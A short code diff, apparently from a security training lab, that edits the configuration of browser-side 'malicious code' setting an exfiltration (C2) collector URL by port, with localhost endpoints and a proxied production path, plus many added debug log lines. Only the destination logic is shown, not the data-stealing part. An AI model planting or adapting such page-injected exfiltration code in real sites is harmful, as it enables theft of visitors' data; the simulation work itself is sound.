@@ -258,7 +258,26 @@
     // Configuration - would be obfuscated in real attacks
     // Dynamically determine C2 URL based on environment
     const hostname = window.location.hostname
-    let exfilUrl = 'http://localhost:3000/collect' // Local development default
+    console.log("Inside malicious code at the start. Mohammad");
+    console.log("Printing  port...");
+    console.log(window.location.port);
+    let exfilUrl = '';
+    console.log("exfilUrl has been initialized to empty string");
+    console.log("printing typeof window.location.port to see type for this variable");
+    console.info(typeof window.location.port);
+    if (window.location.port === "8080"){
+      console.info("inside if statement in malicious code.");
+      exfilUrl = 'http://localhost:3000/collect'
+      console.info('exfilUrl from if statement is printed below');
+      console.info(exfilUrl);
+    }
+    else if (window.location.port === "9001"){
+      console.info("inside else if statement in malicious code.");
+      exfilUrl = 'http://localhost:9002/collect';
+      console.info('exfilUrl from else if statement is printed below');
+      console.info(exfilUrl);
+    }
+     // Local development default
 
     // Production and staging - use relative URL since C2 is proxied by nginx
     if (hostname.includes('run.app') || hostname.includes('pcioasis.com')) {
